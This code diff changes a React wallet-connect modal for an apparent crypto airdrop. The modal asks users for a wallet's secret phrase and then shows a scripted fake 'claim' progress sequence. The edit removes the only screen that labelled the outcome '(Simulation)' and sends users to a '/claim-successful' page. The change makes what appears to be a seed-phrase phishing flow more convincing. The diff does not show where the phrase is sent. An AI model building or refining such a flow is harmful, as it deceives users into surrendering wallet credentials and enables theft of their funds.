@@ -4,6 +4,7 @@ import * as React from "react";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { z } from "zod";
+import { useRouter } from "next/navigation";
 import { ArrowLeft, Copy, CheckCircle } from "lucide-react";
 import { cn } from "@/lib/utils";
 
@@ -491,7 +492,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
   );
 }
 
-function ProcessingView() {
+function ProcessingView({ onComplete }) {
   const [progress, setProgress] = React.useState(0);
   const [message, setMessage] = React.useState("Initializing secure connection...");
 
@@ -518,34 +519,24 @@ function ProcessingView() {
       setMessage("Claim successful!");
     }, 6500));
 
+    timers.push(setTimeout(() => {
+      onComplete();
+    }, 7500));
+
     return () => timers.forEach(clearTimeout);
-  }, []);
+  }, [onComplete]);
 
   return (
     <div className="flex flex-col items-center justify-center text-center p-8 min-h-[400px]">
-      {progress < 100 ? (
-         <>
-          <div className="w-16 h-16 relative mb-6">
-            <div className="w-full h-full border-4 border-primary/20 rounded-full" />
-            <div className="w-full h-full border-4 border-primary border-t-transparent rounded-full animate-spin absolute top-0 left-0" />
-          </div>
-          <DialogTitle className="font-headline text-2xl mb-2">
-            Claiming in Process
-          </DialogTitle>
-          <p className="text-muted-foreground mb-6">{message}</p>
-          <Progress value={progress} className="w-full" />
-        </>
-      ) : (
-         <>
-          <CheckCircle className="w-16 h-16 text-green-500 mb-6" />
-          <DialogTitle className="font-headline text-2xl mb-2">
-            Airdrop Claimed!
-          </DialogTitle>
-          <p className="text-muted-foreground">
-            Your ZK tokens have been successfully sent to your wallet. (Simulation)
-          </p>
-        </>
-      )}
+      <div className="w-16 h-16 relative mb-6">
+        <div className="w-full h-full border-4 border-primary/20 rounded-full" />
+        <div className="w-full h-full border-4 border-primary border-t-transparent rounded-full animate-spin absolute top-0 left-0" />
+      </div>
+      <DialogTitle className="font-headline text-2xl mb-2">
+        Claiming in Process
+      </DialogTitle>
+      <p className="text-muted-foreground mb-6">{message}</p>
+      <Progress value={progress} className="w-full" />
     </div>
   );
 }
@@ -554,6 +545,7 @@ function ProcessingView() {
 export function WalletConnectModal({ isOpen, onOpenChange }) {
   const [view, setView] = React.useState("wallets"); // 'wallets', 'form', 'processing'
   const [selectedWallet, setSelectedWallet] = React.useState(null);
+  const router = useRouter();
 
   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
@@ -567,9 +559,14 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
   
   const handleFormSuccess = () => {
     setView("processing");
-     setTimeout(() => {
-      handleClose(false);
-    }, 8000); // Auto-close after success animation
+  };
+
+  const handleProcessingComplete = () => {
+    onOpenChange(false);
+    // Add a small delay to allow modal to close before navigating
+    setTimeout(() => {
+      router.push('/claim-successful');
+    }, 150);
   };
   
   const handleClose = (open) => {
@@ -603,7 +600,7 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
           />
         );
       case "processing":
-        return <ProcessingView />;
+        return <ProcessingView onComplete={handleProcessingComplete} />;
       case "wallets":
       default:
         return (
